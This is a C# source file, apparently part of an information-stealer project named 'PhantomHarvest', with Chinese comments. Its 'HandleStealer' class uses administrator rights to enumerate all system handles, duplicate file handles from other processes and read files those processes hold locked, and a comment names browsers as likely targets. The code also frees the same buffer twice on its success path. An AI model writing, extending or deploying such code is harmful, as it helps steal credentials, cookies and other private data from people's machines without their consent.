using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Principal;

namespace PhantomHarvest.Helper
{
    internal class HandleStealer
    {
        public static bool IsAdmin()
        {
            try
            {
                using (WindowsIdentity current = WindowsIdentity.GetCurrent())
                {
                    return new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch
            {
                return false;
            }
        }

        public static byte[] GetFileContentViaHandleDuplication(string path)
        {
            if (!IsAdmin()) return null;

            // 规范化路径以便比较
            string targetPath = Path.GetFullPath(path);

            // 获取所有系统句柄
            int length = 0x10000;
            IntPtr ptr = Marshal.AllocHGlobal(length);
            int returnLength = 0;

            while (Win32Api.NtQuerySystemInformation(Win32Api.SystemHandleInformation, ptr, length, ref returnLength) == Win32Api.STATUS_INFO_LENGTH_MISMATCH)
            {
                length = returnLength;
                Marshal.FreeHGlobal(ptr);
                ptr = Marshal.AllocHGlobal(length);
            }

            // 遍历句柄
            // 注意：SYSTEM_HANDLE_INFORMATION 的结构主要取决于操作系统版本，但通常以计数开始。
            // 如果 Win32Api 中的结构定义对于数组封送处理不完美，我们将使用简化的方法按偏移量迭代。
            // 但是，让我们先尝试读取计数。
            
            try
            {
                int handleCount = Marshal.ReadInt32(ptr);
                // 在 x64 上，SYSTEM_HANDLE_INFORMATION 是：NumberOfHandles (4 字节), Padding (4 字节), 然后是数组。
                // 在 x86 上，NumberOfHandles (4 字节), 然后是数组。
                // 数组项是 SYSTEM_HANDLE_TABLE_ENTRY_INFO。
                
                int offset = 4;
                if (IntPtr.Size == 8) offset = 8; // 假设 x64 上由于对齐有 8 字节头
                
                IntPtr handlePtr = new IntPtr(ptr.ToInt64() + offset);
                
                // 我们需要小心结构体的大小和打包。
                // 现有的 Win32Api.SYSTEM_HANDLE_INFORMATION 具有 Pack=1。
                // 如果操作系统返回对齐的数据，我们可能需要调整。
                // 但是，现在让我们依赖 Marshal.SizeOf，但如果是 Pack=1，它可能比实际步幅小。
                // 在 x64 上，步幅可能是 24 字节（20 字节数据 + 4 字节填充）。
                // 在 x86 上，步幅可能是 16 字节（16 字节数据）。
                // 如果需要，让我们手动计算步幅。
                
                int structSize = Marshal.SizeOf(typeof(Win32Api.SYSTEM_HANDLE_INFORMATION));
                // 如果 Pack=1，大小是 20 (x64) 或 16 (x86)。
                // 如果我们怀疑有填充，我们可能需要添加它。
                // 目前，让我们假设现有的结构定义是正确的，否则我们可能会偏移。
                // 但为了更安全，如果需要，让我们重新对齐 handlePtr？不，这太难了。
                
                for (int i = 0; i < handleCount; i++)
                {
                    Win32Api.SYSTEM_HANDLE_INFORMATION info = (Win32Api.SYSTEM_HANDLE_INFORMATION)Marshal.PtrToStructure(handlePtr, typeof(Win32Api.SYSTEM_HANDLE_INFORMATION));
                    handlePtr = new IntPtr(handlePtr.ToInt64() + structSize);

                    // 如果我们想要优化（例如仅浏览器），可以按进程 ID 过滤，但现在检查所有。
                    // 还要检查 ObjectType。文件对象通常具有特定的类型索引，但它在操作系统版本之间会发生变化。
                    // 我们可以尝试复制所有看起来像文件的东西（或者只是所有东西并处理错误）。
                    
                    // 跳过我们自己的进程
                    if (info.ProcessID == Process.GetCurrentProcess().Id) continue;

                    IntPtr processHandle = Win32Api.OpenProcess(Win32Api.PROCESS_ACCESS_FLAGS.PROCESS_DUP_HANDLE, false, info.ProcessID);
                    if (processHandle == IntPtr.Zero) continue;

                    IntPtr dupHandle;
                    if (Win32Api.DuplicateHandle(processHandle, (IntPtr)info.Handle, Win32Api.GetCurrentProcess(), out dupHandle, 0, false, Win32Api.DUPLICATE_SAME_ACCESS))
                    {
                        // 检查是否是文件并获取名称
                        // 我们可以使用 GetFinalPathNameByHandle 或 NtQueryObject
                        // 带 ObjectNameInformation 的 NtQueryObject 是标准的。
                        
                        string fileName = GetPathFromHandle(dupHandle);
                        if (!string.IsNullOrEmpty(fileName))
                        {
                            // 比较路径
                            // 句柄的路径可能是设备路径，如 \Device\HarddiskVolume3\Users\...
                            // 我们需要处理这个问题。
                            if (PathsMatch(fileName, targetPath))
                            {
                                // 找到了！读取内容。
                                byte[] content = ReadFromHandle(dupHandle);
                                Win32Api.CloseHandle(dupHandle);
                                Win32Api.CloseHandle(processHandle);
                                Marshal.FreeHGlobal(ptr);
                                return content;
                            }
                        }
                        Win32Api.CloseHandle(dupHandle);
                    }
                    Win32Api.CloseHandle(processHandle);
                }
            }
            catch {}
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return null;
        }

        private static string GetPathFromHandle(IntPtr handle)
        {
            StringBuilder sb = new StringBuilder(2048);
            if (Win32Api.GetFinalPathNameByHandle(handle, sb, sb.Capacity, Win32Api.FILE_NAME_NORMALIZED) > 0)
            {
                return sb.ToString();
            }
            return null;
        }

        private static bool PathsMatch(string devicePath, string targetPath)
        {
            // devicePath 通常是 \\?\C:\Users... 或 \Device\HarddiskVolume...
            // targetPath 是 C:\Users...
            
            // 简单检查：如果 devicePath 包含 targetPath（忽略大小写）
            // 但我们需要小心驱动器号与卷路径。
            // 让我们尝试将 targetPath 转换为设备路径？或者只是宽松匹配。
            
            // 如果 GetFinalPathNameByHandle 返回 \\?\C:\...，我们可以直接去掉 \\?\
            if (devicePath.StartsWith(@"\\?\"))
            {
                devicePath = devicePath.Substring(4);
            }
            
            return string.Equals(devicePath, targetPath, StringComparison.OrdinalIgnoreCase);
        }

        private static byte[] ReadFromHandle(IntPtr handle)
        {
            // 我们有一个文件句柄。我们不能轻易地将其包装在 FileStream 中，因为 FileStream 通常拥有所有权或需要特定的构造函数。
            // 但我们可以使用 Win32 ReadFile。
            
            long fileSize;
            if (Win32Api.GetFileSizeEx(handle, out fileSize))
            {
                if (fileSize == 0) return new byte[0];
                if (fileSize > 100 * 1024 * 1024) return null; // 安全限制 100MB

                byte[] buffer = new byte[fileSize];
                uint bytesRead;
                // 需要先将文件指针设置为 0 吗？是的，复制句柄共享文件指针？
                // 实际上，具有相同访问权限的 DuplicateHandle 共享文件指针！
                // 所以我们必须将其设置为 0。
                
                Win32Api.SetFilePointer(handle, 0, 0, 0); // FILE_BEGIN = 0
                
                if (Win32Api.ReadFile(handle, buffer, (uint)fileSize, out bytesRead, IntPtr.Zero))
                {
                    return buffer;
                }
            }
            return null;
        }
    }
}
